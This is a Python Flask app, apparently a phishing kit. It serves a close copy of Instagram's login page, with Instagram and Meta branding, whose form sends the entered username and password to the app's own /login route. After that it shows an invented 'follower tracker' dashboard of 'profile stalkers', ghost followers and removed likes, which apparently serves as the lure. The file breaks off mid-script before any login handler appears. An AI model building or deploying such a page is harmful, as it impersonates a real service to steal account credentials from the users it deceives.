from flask import Flask, request, render_template_string
import random

app = Flask(__name__)

# ================= Login Page HTML (Instagram UI) =================
LOGIN_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">

<style>
* {
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
                 Roboto, Helvetica, Arial, sans-serif;
}

body {
    margin: 0;
    background: #ffffff;
    min-height: 100vh;
    display: flex;
    justify-content: center;
}

/* Main wrapper */
.app {
    width: 100%;
    max-width: 420px;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding-top: 22px;
    padding-bottom: env(safe-area-inset-bottom);
}

/* Top content */
.content {
    width: 100%;
    padding: 0 24px;
    text-align: center;
    flex: 1;
}

/* Language */
.language {
    font-size: 14px;
    color: #262626;
    margin-bottom: 34px;
}

/* Logo */
.logo img {
    width: 70px;
    height: 70px;
    margin-bottom: 38px;
}

/* Inputs */
.inputs {
    display: flex;
    flex-direction: column;
    gap: 10px;
}

input {
    padding: 14px 12px;
    font-size: 14px;
    border-radius: 10px;
    border: 1px solid #dbdbdb;
    background: #fafafa;
}

input::placeholder {
    color: #8e8e8e;
}

/* Login button */
.login-btn {
    width: 100%;
    margin-top: 12px;
    padding: 12px 0;
    background: #0095f6;
    color: #fff;
    border: none;
    border-radius: 24px;
    font-size: 15px;
    font-weight: 600;
}

/* Forgot */
.forgot {
    margin-top: 18px;
    font-size: 14px;
    color: #262626;
}

/* Create account */
.create {
    margin-top: 36px;
}

.create button {
    width: 100%;
    padding: 12px 0;
    border-radius: 24px;
    border: 1px solid #0095f6;
    background: transparent;
    color: #0095f6;
    font-size: 15px;
    font-weight: 600;
}

/* Bottom section */
.bottom {
    width: 100%;
    text-align: center;
    padding-bottom: env(safe-area-inset-bottom);
}

/* Meta */
.meta {
    font-size: 14px;
    color: #8e8e8e;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 6px;
    margin-bottom: 6px;
}

/* Footer links */
.footer {
    font-size: 12px;
    color: #8e8e8e;
    padding: 0 18px 12px;
    line-height: 1.6;
}
</style>
</head>

<body>

<div class="app">

    <div class="content">
        <div class="language">English (US)</div>

        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
        </div>

        <form action="/login" method="POST">
            <div class="inputs">
                <input type="text" name="username" placeholder="Username, email or mobile number" required>
                <input type="password" name="password" placeholder="Password" required>
            </div>

            <button type="submit" class="login-btn">Log in</button>

            <div class="forgot">Forgot password?</div>

            <div class="create">
                <button type="button">Create new account</button>
            </div>
        </form>
    </div>

    <div class="bottom">
        <div class="meta">
            <span>∞</span>
            <span>Meta</span>
        </div>

        <div class="footer">
            © Meta 2025 · Privacy · Cookie Policy · Terms · English (UK)
        </div>
    </div>

</div>

</body>
</html>
"""

# ================= Results Page HTML =================
RESULTS_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Insight — Follower Tracker</title>
<style>
:root{--bg:#fff;--bg2:#fff;--card:#fafafa;--line:#dbdbdb;--tx:#000;--mut:#737373;--chip:#efefef;--blue:#0095f6;--red:#ed4956;--ig:linear-gradient(45deg,#feda75,#fa7e1e 25%,#d62976 55%,#962fbf 78%,#4f5bd5);--glow:rgba(214,41,118,.10);--e:cubic-bezier(.22,1,.36,1);--sh:0 1px 2px rgba(0,0,0,.04),0 8px 24px rgba(0,0,0,.05);--sh2:0 2px 4px rgba(0,0,0,.05),0 18px 44px rgba(0,0,0,.13);box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#000;--bg2:#000;--card:#121212;--line:#262626;--tx:#f5f5f5;--mut:#a8a8a8;--chip:#262626;--glow:rgba(214,41,118,.16);--sh:0 1px 2px rgba(0,0,0,.4),0 8px 24px rgba(0,0,0,.4);--sh2:0 2px 4px rgba(0,0,0,.5),0 18px 44px rgba(0,0,0,.6)}}
:root[data-theme="dark"]{--bg:#000;--bg2:#000;--card:#121212;--line:#262626;--tx:#f5f5f5;--mut:#a8a8a8;--chip:#262626;--glow:rgba(214,41,118,.16);--sh:0 1px 2px rgba(0,0,0,.4),0 8px 24px rgba(0,0,0,.4);--sh2:0 2px 4px rgba(0,0,0,.5),0 18px 44px rgba(0,0,0,.6)}
*{box-sizing:border-box;margin:0;-webkit-tap-highlight-color:transparent}
html,body{height:100%}
html{scroll-behavior:smooth}
body{background:color-mix(in srgb,var(--bg2) 94%,#808080);color:var(--tx);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;flex-direction:column;align-items:center;overflow:hidden;font-variant-numeric:tabular-nums;transition:background .5s var(--e),color .5s var(--e)}
.top{display:flex;padding:4px;background:var(--chip);border-radius:99px;margin:12px 0 2px;box-shadow:inset 0 1px 3px rgba(0,0,0,.08)}
.top button{border:0;background:none;color:var(--mut);padding:7px 18px;border-radius:99px;font:600 13px inherit;cursor:pointer;transition:all .35s var(--e)}
.top button:hover{color:var(--tx)}
.top button.on{background:var(--tx);color:var(--bg);box-shadow:0 4px 12px rgba(0,0,0,.2)}
.frame{container-type:inline-size;position:relative;width:100%;flex:1;min-height:0;max-width:1240px;margin:10px 16px 16px;border:1px solid var(--line);border-radius:22px;overflow:hidden;background:var(--bg2);box-shadow:var(--sh2);transition:max-width .6s var(--e),border-radius .6s var(--e),background .5s,border-color .5s}
.frame.mobile{max-width:394px;border-radius:46px;border:9px solid #1c1c1e;box-shadow:0 40px 90px rgba(0,0,0,.4)}
.app{display:grid;grid-template-columns:244px 1fr;grid-template-rows:auto 1fr auto;height:100%}
.side{grid-row:1/4;border-right:1px solid var(--line);padding:24px 12px 20px;display:flex;flex-direction:column;overflow:auto;transition:border-color .5s}
.logo{font:italic 700 30px Georgia,"Times New Roman",serif;letter-spacing:-.5px;padding:6px 12px 26px;text-align:center}
.logo span{background:var(--ig);background-size:220% 100%;-webkit-background-clip:text;background-clip:text;color:transparent;animation:sh 8s ease-in-out infinite alternate}
@keyframes sh{to{background-position:100% 0}}
.nav{display:flex;flex-direction:column;gap:2px}
.nav button{position:relative;display:flex;align-items:center;gap:16px;border:0;background:none;color:var(--tx);font:400 15.5px inherit;padding:12px;border-radius:12px;cursor:pointer;transition:background .3s var(--e),transform .35s var(--e)}
.nav button::before{content:"";position:absolute;left:-12px;top:50%;width:4px;height:0;border-radius:0 4px 4px 0;background:var(--ig);transform:translateY(-50%);transition:height .4s var(--e)}
.nav button.on::before{height:26px}
.nav button:hover{background:var(--chip);transform:translateX(5px)}
.nav button:active{transform:scale(.97)}
.nav button svg{width:25px;height:25px;flex:none;transition:transform .35s var(--e)}
.nav button:hover svg{transform:scale(1.12) rotate(-4deg)}
.nav button.on{font-weight:700}
.nav button.on svg{stroke-width:2.6}
.nav .n{margin-left:auto;min-width:20px;height:20px;padding:0 6px;border-radius:99px;background:var(--red);color:#fff;font:700 11px/20px inherit;text-align:center;box-shadow:0 3px 8px rgba(237,73,86,.4)}
.me{margin-top:auto;display:flex;gap:12px;align-items:center;padding:12px;border-radius:12px;transition:background .3s}
.me:hover{background:var(--chip)}
.me b{font-size:14px;display:block;font-weight:600}.me small{color:var(--mut);font-size:12px}
.mtop{display:none;grid-column:1;grid-template-columns:1fr auto 1fr;align-items:center;padding:10px 16px;border-bottom:1px solid var(--line);backdrop-filter:blur(24px) saturate(180%);background:color-mix(in srgb,var(--bg) 80%,transparent)}
.mtop .logo{padding:0;font-size:27px}
.mtop svg{width:25px;height:25px}
#mh{justify-self:end;border:0;background:none;color:var(--tx);cursor:pointer;display:grid;place-items:center;padding:2px;transition:transform .5s var(--e)}
#mh:hover{transform:rotate(90deg)}
main{grid-row:1/4;overflow:auto;position:relative}
.in{max-width:780px;margin:0 auto;padding:34px 28px 50px;position:relative}
.in.pg{animation:pg .6s var(--e) both}
@keyframes pg{from{opacity:0;transform:translateY(16px) scale(.99);filter:blur(5px)}}
main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;background:radial-gradient(60% 100% at 50% 0,var(--glow),transparent);pointer-events:none}
.prof{display:flex;gap:34px;align-items:center;margin-bottom:26px}
.ring{flex:none;border-radius:50%;padding:3px;background:var(--ig);position:relative;transition:transform .45s var(--e),box-shadow .45s var(--e)}
.ring>span{display:grid;place-items:center;border-radius:50%;border:3px solid var(--bg2);color:#fff;font-weight:700;overflow:hidden}
.ring.l{width:116px;height:116px;box-shadow:0 10px 30px var(--glow)}.ring.l>span{width:100%;height:100%;font-size:32px}
.ring.l:hover{transform:rotate(8deg) scale(1.06);box-shadow:0 14px 40px rgba(214,41,118,.35)}
.ring.m{width:54px;height:54px;padding:2.5px}.ring.m>span{width:100%;height:100%;border-width:2.5px;font-size:15px}
.ring.s{width:46px;height:46px;padding:2.5px}.ring.s>span{width:100%;height:100%;border-width:2.5px;font-size:14px}
.ring.off{background:var(--line)}
.pi{flex:1;min-width:0}
.pi .h{display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:16px}
.pi h2{font:400 20px inherit}
.pi .st{display:flex;gap:34px;margin-bottom:14px;font-size:15px}
.pi .st b{font-weight:700}
.pi p{font-size:14px;line-height:1.45}.pi p span{color:var(--mut)}
.btn{border:0;border-radius:10px;padding:8px 18px;font:600 14px inherit;cursor:pointer;background:var(--blue);color:#fff;box-shadow:0 4px 14px rgba(0,149,246,.32);transition:transform .3s var(--e),filter .2s,box-shadow .3s var(--e),background .3s;white-space:nowrap}
.btn:hover{filter:brightness(1.08);transform:translateY(-2px);box-shadow:0 8px 20px rgba(0,149,246,.42)}
.btn:active{transform:scale(.95);box-shadow:none}
.btn.g,.btn.r{box-shadow:none}
.btn.g{background:var(--chip);color:var(--tx)}
.btn.g:hover,.btn.r:hover{box-shadow:0 6px 16px rgba(0,0,0,.12)}
.btn.r{background:var(--chip);color:var(--red)}
.sec{display:flex;align-items:baseline;justify-content:space-between;margin:26px 0 14px}
.sec h3{font:700 15px inherit}.sec a{color:var(--blue);font:600 13px inherit;cursor:pointer;transition:letter-spacing .3s var(--e),opacity .2s}.sec a:hover{letter-spacing:.4px;opacity:.8}
.stories{display:flex;gap:18px;overflow:auto;padding:8px 6px 10px;scrollbar-width:none}
.stories::-webkit-scrollbar{display:none}
.stories>div{flex:none;width:68px;text-align:center;cursor:pointer;position:relative;transition:transform .4s var(--e);animation:up .6s var(--e) both}
.stories>div:nth-child(2){animation-delay:.06s}.stories>div:nth-child(3){animation-delay:.12s}.stories>div:nth-child(4){animation-delay:.18s}.stories>div:nth-child(5){animation-delay:.24s}
.stories>div:hover{transform:translateY(-4px) scale(1.06)}
.stories .ring{margin:0 auto 7px;width:68px;height:68px}.stories .ring>span{width:100%;height:100%;font-size:19px}
.stories small{font-size:12px;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.stories em{position:absolute;top:0;right:0;background:var(--red);color:#fff;font:700 10.5px/18px inherit;min-width:18px;border-radius:9px;border:2px solid var(--bg2);box-sizing:content-box;padding:0 3px;font-style:normal}
@keyframes up{from{opacity:0;transform:translateY(18px)}}
.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
.card{position:relative;overflow:hidden;background:var(--card);border:1px solid var(--line);border-radius:18px;padding:16px 18px;cursor:pointer;box-shadow:var(--sh);transition:transform .45s var(--e),box-shadow .45s var(--e),border-color .3s;animation:up .65s var(--e) both}
.card:nth-child(2){animation-delay:.05s}.card:nth-child(3){animation-delay:.1s}.card:nth-child(4){animation-delay:.15s}.card:nth-child(5){animation-delay:.2s}.card:nth-child(6){animation-delay:.25s}
.card::after{content:"";position:absolute;inset:0;background:radial-gradient(120% 90% at 100% 0,var(--glow),transparent 65%);opacity:0;transition:opacity .45s;pointer-events:none}
.card:hover{transform:translateY(-5px);box-shadow:var(--sh2);border-color:color-mix(in srgb,var(--mut) 60%,transparent)}
.card:hover::after{opacity:1}
.card:active{transform:translateY(-1px) scale(.98)}
.card small{color:var(--mut);font-size:12.5px;display:flex;align-items:center;justify-content:space-between}
.card small svg{width:18px;height:18px;transition:transform .45s var(--e)}
.card:hover small svg{transform:scale(1.25) rotate(-10deg);color:var(--tx)}
.card b{display:block;font:700 28px inherit;letter-spacing:-.8px;margin:8px 0 2px}
.card i{font-style:normal;font-size:12px;color:var(--mut)}
.card i.up{color:#2ecc71}.card i.dn{color:var(--red)}
.two{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.panel{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:18px;box-shadow:var(--sh);transition:transform .45s var(--e),box-shadow .45s var(--e);animation:up .7s .2s var(--e) both}
.panel:hover{transform:translateY(-3px);box-shadow:var(--sh2)}
.panel h4{font:600 13.5px inherit;margin-bottom:16px}
.donut{display:flex;align-items:center;gap:20px}
.donut svg{width:104px;height:104px;flex:none;transition:transform .6s var(--e)}
.panel:hover .donut svg{transform:rotate(12deg) scale(1.05)}
.donut circle:not(:first-child){animation:dr 1.2s .3s var(--e) both}
@keyframes dr{from{stroke-dasharray:0 100}}
.leg{display:grid;gap:8px;font-size:13px;color:var(--mut)}.leg b{color:var(--tx)}
.leg em{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:8px}
.spark{display:flex;align-items:flex-end;gap:8px;height:86px}
.spark i{flex:1;border-radius:5px 5px 2px 2px;background:var(--ig);transform-origin:bottom;animation:g .9s both var(--e);transition:filter .3s,transform .4s var(--e)}
.spark i:hover{filter:brightness(1.15) saturate(1.3);transform:scaleY(1.07)}
@keyframes g{from{transform:scaleY(0)}}
.sl{display:flex;gap:8px;margin-top:8px;font-size:11px;color:var(--mut)}.sl span{flex:1;text-align:center}
.bar{display:flex;gap:8px;margin:6px 0 14px;flex-wrap:wrap;align-items:center}
.search{flex:1;min-width:150px;background:var(--chip);border:0;border-radius:12px;padding:11px 14px;color:var(--tx);font:400 14.5px inherit;outline:0;transition:box-shadow .3s var(--e),background .3s}
.search:focus{background:var(--bg2);box-shadow:0 0 0 2px var(--blue),0 8px 24px rgba(0,149,246,.18)}
.search::placeholder{color:var(--mut)}
.chip{border:0;background:var(--chip);color:var(--tx);padding:9px 15px;border-radius:10px;font:600 13px inherit;cursor:pointer;transition:all .35s var(--e)}
.chip:hover{transform:translateY(-2px);box-shadow:0 6px 14px rgba(0,0,0,.1)}
.chip:active{transform:scale(.94)}
.chip.on{background:var(--tx);color:var(--bg)}
.ttl{font:700 24px inherit;letter-spacing:-.5px}.sub{color:var(--mut);font-size:14px;margin:4px 0 20px}
.row{display:flex;align-items:center;gap:13px;padding:9px 10px;margin:0 -10px;border-radius:14px;animation:in .5s both var(--e);transition:background .3s,transform .4s var(--e),box-shadow .4s var(--e)}
.row:hover{background:var(--chip);transform:translateX(5px)}
.row:hover .ring{transform:scale(1.08)}
@keyframes in{from{opacity:0;transform:translateY(10px)}}
.info{flex:1;min-width:0}
.info b{font:600 14px inherit;display:flex;align-items:center;gap:5px}
.info small{display:block;color:var(--mut);font-size:13px;margin-top:1px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.vf{width:14px;height:14px;fill:var(--blue);flex:none}
.tag{font:600 11px inherit;padding:3px 8px;border-radius:6px;background:var(--chip);color:var(--mut)}
.tag.red{color:var(--red)}.tag.hot{color:#d62976}
.ic{width:46px;height:46px;border-radius:50%;display:grid;place-items:center;background:var(--chip);flex:none;transition:transform .45s var(--e)}
.row:hover .ic{transform:scale(1.1) rotate(-6deg)}
.ic svg{width:22px;height:22px}
.th{width:44px;height:44px;border-radius:8px;flex:none;transition:transform .4s var(--e)}
.row:hover .th{transform:scale(1.1) rotate(4deg)}
.day{font:700 15px inherit;margin:18px 0 6px}
.bn{display:none;grid-column:1;grid-template-columns:repeat(5,1fr);border-top:1px solid var(--line);background:color-mix(in srgb,var(--bg) 82%,transparent);backdrop-filter:blur(24px) saturate(180%);padding:6px 4px calc(8px + env(safe-area-inset-bottom,0px))}
.bn button{border:0;background:none;color:var(--tx);display:grid;place-items:center;padding:10px 0;cursor:pointer;position:relative;transition:transform .3s var(--e)}
.bn button:active{transform:scale(.8)}
.bn svg{width:26px;height:26px;transition:transform .4s var(--e)}
.bn button.on svg{stroke-width:2.8;transform:translateY(-2px) scale(1.1)}
.bn .n{position:absolute;top:4px;left:calc(50% + 6px);background:var(--red);color:#fff;border-radius:99px;font:700 10px/16px inherit;min-width:16px;padding:0 4px}
.empty{padding:50px 0;text-align:center;color:var(--mut)}
.srow{display:flex;align-items:center;gap:14px;padding:14px 0;border-bottom:1px solid var(--line)}
.srow .info small{white-space:normal;line-height:1.35}
.srow.lk{cursor:pointer;transition:padding .35s var(--e)}.srow.lk:hover{padding-left:8px}.srow .ch{color:var(--mut);font-size:22px;line-height:1;transition:transform .35s var(--e)}.srow.lk:hover .ch{transform:translateX(4px)}
.srow.red b{color:var(--red)}
.sw{flex:none;width:46px;height:28px;border-radius:14px;border:0;background:color-mix(in srgb,var(--mut) 50%,transparent);position:relative;cursor:pointer;transition:background .3s,box-shadow .3s}
.sw::after{content:"";position:absolute;top:3px;left:3px;width:22px;height:22px;border-radius:50%;background:#fff;box-shadow:0 2px 5px rgba(0,0,0,.3);transition:transform .45s cubic-bezier(.3,1.5,.5,1),width .2s}
.sw:active::after{width:27px}
.sw.on{background:var(--blue);box-shadow:0 4px 12px rgba(0,149,246,.4)}.sw.on::after{transform:translateX(18px)}.sw.on:active::after{transform:translateX(13px)}
.acc{display:flex;align-items:center;gap:14px;padding:16px;background:var(--card);border:1px solid var(--line);border-radius:18px;margin-bottom:4px;box-shadow:var(--sh)}
.toast{position:fixed;left:50%;bottom:34px;transform:translate(-50%,30px) scale(.95);background:var(--tx);color:var(--bg);padding:12px 22px;border-radius:14px;font:600 13.5px inherit;opacity:0;pointer-events:none;transition:all .5s var(--e);z-index:9;box-shadow:var(--sh2)}
.toast.show{opacity:1;transform:translate(-50%,0) scale(1)}
@container (max-width:760px){
 .app{grid-template-columns:1fr}
 .side{display:none}
 .mtop{display:grid}
 .bn{display:grid}
 main{grid-row:2}
 .in{padding:18px 16px 28px}
 .prof{gap:20px;align-items:flex-start;flex-wrap:wrap}
 .ring.l{width:84px;height:84px}.ring.l>span{font-size:24px}
 .pi{flex:1 1 150px}
 .pi .st{gap:0;justify-content:space-between;margin:14px 0 0;order:5;flex-basis:100%;text-align:center;border-top:1px solid var(--line);padding-top:12px;font-size:13px}
 .pi .st div{display:flex;flex-direction:column}
 .pi h2{font-size:17px}
 .cards{grid-template-columns:repeat(2,1fr);gap:10px}
 .card{padding:14px}.card b{font-size:24px}
 .two{grid-template-columns:1fr}
 .ttl{font-size:21px}
}
@media (max-width:760px){.top{display:none}.frame,.frame.mobile{margin:0;border:0;border-radius:0;max-width:none;box-shadow:none}}
@media (prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important;transition:none!important}}
</style>
</head>
<body>
<div class="top"><button id="bd" class="on">Desktop</button><button id="bm">Mobile</button></div>
<div class="frame" id="frame"><div class="app">
 <aside class="side">
  <div class="logo"><span>Insight</span></div>
  <nav class="nav" id="nav"></nav>
  <div class="me"><div class="ring m"><span style="background:#262626">YO</span></div><div><b>your.handle</b><small>Synced just now</small></div></div>
 </aside>
 <div class="mtop"><span></span><div class="logo"><span>Insight</span></div><button id="mh" aria-label="Settings"></button></div>
 <main id="main"></main>
 <nav class="bn" id="bn"></nav>
</div></div>
<div class="toast" id="toast"></div>
<script>
const S=p=>`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">${p}</svg>`;
const I={
 home:S('<path d="M3 10.5 12 3l9 7.5V21h-6v-6H9v6H3z"/>'),
 notback:S('<circle cx="9" cy="8" r="4"/><path d="M2 21c0-4 3-6 7-6s7 2 7 6M17 8l5 5M22 8l-5 5"/>'),
 ghosts:S('<path d="M5 21V11a7 7 0 0 1 14 0v10l-3-2-2 2-2-2-2 2-2-2z"/><circle cx="9.5" cy="11" r=".6"/><circle cx="14.5" cy="11" r=".6"/>'),
 stalkers:S('<path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7S2 12 2 12z"/><circle cx="12" cy="12" r="3"/>'),
 act:S('<path d="M12 21s-8-5.5-8-11a4.5 4.5 0 0 1 8-2.8A4.5 4.5 0 0 1 20 10c0 5.5-8 11-8 11z"/>'),
 broken:S('<path d="M12 21s-8-5.5-8-11a4.5 4.5 0 0 1 8-2.8A4.5 4.5 0 0 1 20 10c0 5.5-8 11-8 11z"/><path d="m12 7.5-2 4 3 1-1 4"/>'),
 trash:S('<path d="M4 7h16M10 11v6M14 11v6M6 7l1 13h10l1-13M9 7V4h6v3"/>'),
 chat:S('<path d="M21 12a8 8 0 0 1-11.7 7L3 21l2-5.5A8 8 0 1 1 21 12z"/>'),
 out:S('<path d="M9 4H4v16h5M16 8l4 4-4 4M20 12H9"/>'),
 plus:S('<circle cx="9" cy="8" r="4"/><path d="M2 21c0-4 3-6 7-6s7 2 7 6M19 8v6M16 11h6"/>'),
 set:S('<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.7 1.7 0 0 0 .3 1.8l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.7 1.7 0 0 0-1.8-.3 1.7 1.7 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.7 1.7 0 0 0-1.1-1.5 1.7 1.7 0 0 0-1.8.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.7 1.7 0 0 0 .3-1.8 1.7 1.7 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.7 1.7 0 0 0 1.5-1.1 1.7 1.7 0 0 0-.3-1.8l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.7 1.7 0 0 0 1.8.3H9a1.7 1.7 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.7 1.7 0 0 0 1 1.5 1.7 1.7 0 0 0 1.8-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.7 1.7 0 0 0-.3 1.8V9a1.7 1.7 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.7 1.7 0 0 0-1.5 1z"/>')
};
const VF='<svg class="vf" viewBox="0 0 24 24"><path d="M12 1.5l2.6 1.8 3.1-.2 1.2 2.9 2.7 1.6-.7 3 1 2.9-2.2 2.2-.4 3.1-3 .7-2.2 2.2L12 19.8 9 21l-2.5-2.1-3-.7-.4-3.1L1 12.8l1-2.9-.7-3 2.7-1.6 1.2-2.9 3.1.2z"/><path d="m8 12.3 2.8 2.8L16.5 9" fill="none" stroke="#fff" stroke-width="2"/></svg>';
const G=["#fa7e1e,#d62976","#d62976,#962fbf","#4f5bd5,#962fbf","#0095f6,#4f5bd5","#feda75,#fa7e1e","#2ecc71,#0095f6"];
const u=(n,h,m,x={})=>({n,h,m,...x});
const D={
 notback:[u("Aria Moreau","aria.moreau","Followed since Mar 2024",{v:1}),u("Kai Nakamura","kai.nkmr","Followed 8 months ago"),u("Sofia Laurent","sofia.laurent","Followed 3 weeks ago",{v:1}),u("Mateo Silva","mateo.s","Followed 1 year ago"),u("Zara Khan","zarakhan","Followed 5 months ago"),u("Leo Brandt","leobrandt","Followed 2 days ago")],
 fans:[u("Noor Ahmed","noor.ahmed","Follows you · 4 mutual"),u("Ivy Chen","ivychen.studio","Follows you · 1 mutual"),u("Omar Haddad","omar.h","Follows you")],
 ghosts:[u("Nina Patel","nina.p","No likes or comments in 142 days",{d:142}),u("Jules Moreno","jules.mrn","Never interacted · 11 months",{d:330}),u("Tariq Aziz","tariq.az","No story views in 96 days",{d:96}),u("Elena Rossi","elena.rossi","No interaction in 74 days",{d:74}),u("Finn Walker","finnwalker","Never interacted · 5 months",{d:150})],
 stalkers:[u("Maya Ellis","maya.ellis","Last visit today · 9:41 PM",{c:14}),u("Dev Sharma","dev.sharma","Last visit yesterday",{c:9}),u("Lina Park","lina.park","Last visit 2 days ago",{c:7}),u("Rafi Hasan","rafi.hasan","Last visit 3 days ago",{c:5}),u("Chloe Dubois","chloe.db","Last visit 5 days ago",{c:3})],
 act:[
  {g:"Today",i:"broken",t:"<b>maya.ellis</b> removed her like",s:"12m",c:3,tg:["red","Like removed"]},
  {g:"Today",i:"trash",t:"<b>dev.sharma</b> deleted a comment: “Absolutely stunning 🔥”",s:"1h",c:1,tg:["red","Comment removed"]},
  {g:"Today",i:"out",t:"<b>zane.cole</b> unfollowed you",s:"3h",tg:["red","Unfollow"]},
  {g:"Yesterday",i:"chat",t:"<b>lina.park</b> commented: “Where was this taken?”",s:"1d",c:4,tg:["","Comment"]},
  {g:"Yesterday",i:"act",t:"<b>rafi.hasan</b> liked 6 of your posts in 2 minutes",s:"1d",c:2,tg:["hot","Binge like"]},
  {g:"Yesterday",i:"trash",t:"<b>chloe.db</b> removed a comment: “Love this!”",s:"1d",c:5,tg:["red","Comment removed"]},
  {g:"This week",i:"plus",t:"<b>noor.ahmed</b> started following you",s:"2d",tg:["","New follower"]}]
};
const T=[["home","Overview"],["notback","Not Following Back"],["ghosts","Ghost Followers"],["stalkers","Profile Stalkers"],["act","Activity"]];
let tab="home",q="",f="all",theme="light",anim=true;
try{theme=localStorage.getItem("ins-theme")||"light"}catch(e){}
const P={likes:true,comm:true,unf:true,stalk:false,priv:false};
function applyTheme(){const r=document.documentElement;theme==="system"?r.removeAttribute("data-theme"):r.setAttribute("data-theme",theme)}
const eff=()=>theme==="dark"||(theme==="system"&&matchMedia("(prefers-color-scheme: dark)").matches);
applyTheme();
const $=s=>document.querySelector(s);
const gr=i=>{const [a,b]=G[i%G.length].split(",");return `linear-gradient(135deg,${a},${b})`};
const ini=n=>n.split(" ").map(w=>w[0]).join("");
const av=(x,i,c="s")=>`<div class="ring ${c}"><span style="background:${gr(i)}">${ini(x.n)}</span></div>`;
function nav(){
 const cn={notback:D.notback.length,ghosts:D.ghosts.length};
 $("#nav").innerHTML=T.map(([k,l])=>`<button class="${tab===k?"on":""}" data-k="${k}">${I[k]}${l}${cn[k]?`<span class="n">${cn[k]}</span>`:""}</button>`).join("");
 $("#bn").innerHTML=T.map(([k,l])=>`<button class="${tab===k?"on":""}" data-k="${k}" aria-label="${l}">${I[k]}${cn[k]?`<span class="n">${cn[k]}</span>`:""}</button>`).join("");
 $("#nav").insertAdjacentHTML("beforeend",`<button class="${tab==="settings"?"on":""}" data-k="settings">${I.set}Settings</button>`);
 $("#mh").innerHTML=I.set;$("#mh").onclick=()=>go("settings");
 document.querySelectorAll("[data-k]").forEach(b=>b.onclick=()=>go(b.dataset.k));
}
function go(k){tab=k;q="";f="all";anim=true;render();$("#main").scrollTop=0}
const card=(k,l,n,s,c="")=>`<div class="card" data-k="${k}"><small>${l}${I[k]}</small><b>${n}</b><i class="${c}">${s}</i></div>`;
function home(){
 const b=[40,62,48,80,55,92,70],d=["M","T","W","T","F","S","S"];
 return `<div class="prof"><div class="ring l"><span style="background:linear-gradient(135deg,#262626,#444)">YO</span></div>
 <div class="pi"><div class="h"><h2>your.handle</h2><button class="btn g">Edit profile</button></div>
 <div class="st"><div><b>248</b> posts</div><div><b>12.4K</b> followers</div><div><b>842</b> following</div></div>
 <p><b>Your name</b><br><span>Creator · Insights updated live</span></p></div></div>
 <div class="sec" style="margin-top:6px"><h3>Top profile visitors</h3><a data-k="stalkers">See all</a></div>
 <div class="stories">${D.stalkers.map((x,i)=>`<div data-k="stalkers"><div class="ring" style="padding:3px"><span style="background:${gr(i)}">${ini(x.n)}</span></div><em>${x.c}</em><small>${x.h}</small></div>`).join("")}</div>
 <div class="sec"><h3>Insights</h3></div>
 <div class="cards">
  ${card("notback","Not following back",D.notback.length,"Review list")}
  ${card("ghosts","Ghost followers",D.ghosts.length,"Zero engagement","dn")}
  ${card("stalkers","Regular stalkers",D.stalkers.length,"+3 this week","up")}
  ${card("act","Removed likes",7,"Last 7 days","dn")}
  ${card("act","Deleted comments",4,"Last 7 days","dn")}
  ${card("act","Unfollowed you",3,"Last 7 days","dn")}
 </div>
 <div class="sec"><h3>Overview</h3></div>
 <div class="two">
  <div class="panel"><h4>Follower health</h4><div class="donut"><svg viewBox="0 0 42 42"><circle cx="21" cy="21" r="15.9" fill="none" stroke="var(--chip)" stroke-width="4.5"/><circle cx="21" cy="21" r="15.9" fill="none" stroke="#d62976" stroke-width="4.5" stroke-dasharray="62 38" transform="rotate(-90 21 21)" stroke-linecap="round"/><circle cx="21" cy="21" r="15.9" fill="none" stroke="#0095f6" stroke-width="4.5" stroke-dasharray="22 78" stroke-dashoffset="-65" transform="rotate(-90 21 21)" stroke-linecap="round"/></svg>
  <div class="leg"><div><em style="background:#d62976"></em><b>62%</b> Active</div><div><em style="background:#0095f6"></em><b>24%</b> Passive</div><div><em style="background:var(--chip)"></em><b>14%</b> Ghosts</div></div></div></div>
  <div class="panel"><h4>Profile visits · 7 days</h4><div class="spark">${b.map((v,i)=>`<i style="height:${v}%;animation-delay:${i*70}ms"></i>`).join("")}</div><div class="sl">${d.map(x=>`<span>${x}</span>`).join("")}</div></div>
 </div>`;
}
function actList(a){
 let g="",o="";
 a.forEach((x,i)=>{
  if(x.g!==g){g=x.g;o+=`<div class="day">${g}</div>`}
